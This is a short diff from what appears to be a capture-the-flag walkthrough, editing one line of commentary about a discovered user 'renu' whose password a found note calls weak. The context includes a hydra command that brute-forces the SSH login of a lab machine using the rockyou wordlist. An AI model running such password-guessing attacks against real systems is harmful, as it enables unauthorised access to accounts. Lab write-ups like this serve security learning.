@@ -136,7 +136,7 @@ Hello.....  renu
       I tell you something Important.Your Password is too Week So Change Your Password
 Don't Underestimate it.......
 ```
--> Now I got a user called "renu" and the file tells me the password is too week, so I will use hydra to try and crack the ssh password
+-> Now I got a user called "renu" and the file tells me the password is too "week", so I will use hydra to try and crack the ssh password
 ```
 ┌──(root㉿kali)-[/home/astra]
 └─# hydra -l renu -P rockyou.txt -f 192.168.197.230 ssh -I
